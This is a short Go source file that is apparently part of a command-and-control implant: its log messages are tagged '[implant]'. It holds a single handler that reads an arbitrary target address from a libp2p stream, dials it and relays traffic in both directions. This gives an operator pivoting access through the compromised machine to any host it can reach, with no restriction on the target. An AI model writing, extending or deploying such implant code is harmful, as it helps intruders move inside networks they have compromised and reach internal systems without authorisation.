package core

import (
	"bufio"
	"io"
	"log"
	"net"
	"strings"

	"github.com/libp2p/go-libp2p/core/network"
)

func (a *Agent) handlePortfwdStream(s network.Stream) {
	defer s.Close()

	target, err := bufio.NewReader(s).ReadString('\n')
	if err != nil {
		log.Printf("[implant] portfwd read target: %v", err)
		return
	}
	target = strings.TrimSpace(target)

	conn, err := net.Dial("tcp", target)
	if err != nil {
		log.Printf("[implant] portfwd dial %s: %v", target, err)
		return
	}
	defer conn.Close()

	go io.Copy(conn, s)
	io.Copy(s, conn)
}
